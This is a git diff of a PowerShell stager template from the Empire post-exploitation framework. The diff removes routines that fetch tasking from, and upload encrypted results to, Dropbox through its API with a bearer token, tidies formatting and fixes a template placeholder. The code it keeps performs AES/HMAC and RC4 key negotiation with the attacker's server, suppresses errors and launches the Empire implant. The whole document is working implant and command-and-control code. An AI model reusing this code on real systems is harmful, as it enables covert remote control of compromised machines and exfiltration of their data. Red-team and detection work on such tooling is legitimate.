@@ -12,105 +12,6 @@
 function Start-Negotiate {
     param($T,$SK,$PI=5,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
 
-    $Script:APIToken = "{{ api_token}}";
-
-    $script:GetTask = {
-            try {
-                # build the web request object
-                $wc= New-Object System.Net.WebClient;
-
-                # set the proxy settings for the WC to be the default system settings
-                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {
-                    $wc.Proxy = $Script:Proxy;
-                }
-
-                $wc.Headers.Add("User-Agent", $script:UserAgent);
-                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
-
-                $TaskingsFolder = '{{ tasking_folder }}';
-                $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}");
-                $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
-
-                if($Data -and ($Data.Length -ne 0)) {
-                    # if there was a tasking data, remove it
-                    $wc.Headers.Add("Content-Type", " application/json");
-                    $wc.Headers.Remove("Dropbox-API-Arg");
-                    $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}");
-                    $Data;
-                }
-                $script:MissedCheckins = 0;
-            }
-            catch {
-                if ($_ -match 'Unable to connect') {
-                    $script:MissedCheckins += 1;
-                }
-            }
-        }
-
-    $script:SendMessage = {
-            param($Packets)
-
-            if($Packets) {
-                # build and encrypt the response packet
-                $EncBytes = Encrypt-Bytes $Packets;
-
-                # build the top level RC4 "routing packet"
-                # meta 'RESULT_POST' : 5
-                $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
-
-                # build the web request object
-                $wc = New-Object System.Net.WebClient;
-                # set the proxy settings for the WC to be the default system settings
-                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                if($Script:Proxy) {
-                    $wc.Proxy = $Script:Proxy;
-                }
-
-                $wc.Headers.Add('User-Agent', $Script:UserAgent);
-                $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}};
-
-                $ResultsFolder = '{{ results_folder }}';
-
-                try {
-                    # check if the results file is still in the specified location, if so then
-                    #   download the file and append the new routing packet to it
-                    try {
-                        $Data = $Null;
-                        $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
-                        $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                        $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download");
-                    }
-                    catch { }
-
-                    if($Data -and $Data.Length -ne 0) {
-                        $RoutingPacket = $Data + $RoutingPacket;
-                    }
-
-                    $wc2 = New-Object System.Net.WebClient;
-                    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                    if($Script:Proxy) {
-                        $wc2.Proxy = $Script:Proxy;
-                    }
-
-                    $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)");
-                    $wc2.Headers.Add("Content-Type", "application/octet-stream");
-                    $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
-                    $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket);
-                    $script:MissedCheckins = 0;
-                }
-                catch {
-                    if ($_ -match 'Unable to connect') {
-                        $script:MissedCheckins += 1;
-                    }
-                }
-            }
-        }
-
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
         begin {
@@ -130,7 +31,7 @@ function Start-Negotiate {
                 $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
             }
         }
-    }
+    };
 
     function Decrypt-Bytes {
         param ($Key, $In)
@@ -154,7 +55,7 @@ function Start-Negotiate {
             $AES.IV = $IV;
             ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
         }
-    }
+    };
 
     # make sure the appropriate assemblies are loaded
     $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
@@ -162,15 +63,15 @@ function Start-Negotiate {
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
-    $e=[System.Text.Encoding]::UTF8;
+    $e = [System.Text.Encoding]::UTF8;
 
-    $SKB=$e.GetBytes($SK);
+    $SKB = $e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
     $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     $IV = [byte] 0..255 | Get-Random -count 16;
-    $AES.Mode="CBC";
-    $AES.Key=$SKB;
+    $AES.Mode = "CBC";
+    $AES.Key = $SKB;
     $AES.IV = $IV;
 
     $hmac = New-Object System.Security.Cryptography.HMACSHA256;
@@ -211,7 +112,7 @@ function Start-Negotiate {
     #   meta = STAGE1 (2)
     #   extra = (0x00, 0x00)
     #   length = len($eb)
-    $IV=[BitConverter]::GetBytes($(Get-Random));
+    $IV = [BitConverter]::GetBytes($(Get-Random));
     $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
     $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
     $rc4p = $IV + $rc4p + $eb;
@@ -324,6 +225,6 @@ function Start-Negotiate {
 
     # TODO: remove this shitty $server logic
     Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -ProxySettings $Script:Proxy;
-}
+};
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -T $T -PI "{{ [poll_interval }}" -SK "{{ staging_key }}" -UA $u;
+Start-Negotiate -T $T -PI "{{ poll_interval }}" -SK "{{ staging_key }}" -UA $u;
